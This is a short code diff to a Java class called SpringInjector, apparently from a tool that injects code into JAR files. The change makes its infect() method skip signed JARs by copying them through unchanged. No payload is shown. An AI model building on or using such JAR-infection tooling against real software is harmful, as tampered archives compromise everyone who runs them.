@@ -6,7 +6,9 @@ import javassist.bytecode.annotation.MemberValue;
 
 import java.io.DataInputStream;
 import java.io.IOException;
+import java.nio.file.Files;
 import java.nio.file.Path;
+import java.nio.file.StandardCopyOption;
 import java.util.*;
 import java.util.jar.JarEntry;
 
@@ -24,6 +26,14 @@ public class SpringInjector {
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
         boolean didInfect = false;
         boolean foundSignedClasses = false;
+
+        if (jarLooksSigned(targetJarFilePath)) {
+            System.out.println("[-] JAR looks signed. This is not yet implemented. Aborting.");
+            // Just copy the input JAR to the output JAR to keep up with expected behaviour
+            Files.copy(targetJarFilePath, outputJar, StandardCopyOption.REPLACE_EXISTING);
+            return false;
+        }
+
         try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
             for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                 if (!entry.getName().endsWith(".class")) {
